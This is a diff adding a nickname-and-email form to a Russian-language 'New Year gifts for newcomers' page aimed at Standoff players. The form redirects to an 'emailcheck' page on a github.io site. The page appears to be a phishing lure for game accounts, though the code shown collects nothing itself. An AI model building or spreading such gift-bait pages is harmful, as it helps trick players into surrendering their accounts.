@@ -28,6 +28,19 @@
             margin-top: 20px;
             font-size: 18px;
         }
+        .form-container {
+            margin-top: 20px;
+        }
+        .form-container input {
+            margin: 10px;
+            padding: 10px;
+            font-size: 16px;
+        }
+        .form-container button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -43,6 +56,27 @@
     <div class="footer">
         Раздача новогодних подарков новичкам
     </div>
+
+    <div class="form-container">
+        <input type="text" id="nickname" placeholder="Ник в Standoff" required>
+        <input type="email" id="email" placeholder="Ваш e-mail" required>
+        <button onclick="submitForm()">Продолжить</button>
+    </div>
+
+    <script>
+        function submitForm() {
+            const nickname = document.getElementById('nickname').value;
+            const email = document.getElementById('email').value;
+
+            // Здесь можно добавить валидацию, если необходимо
+
+            // Укажите ваш домен
+            const domain = "https://arbuzik-ameli.github.io/miniature-octo-goggles"; // Замените на ваш домен
+
+            // Перенаправление на страницу emailcheck
+            window.location.href = `${domain}/emailcheck`;
+        }
+    </script>
 
 </body>
 </html>
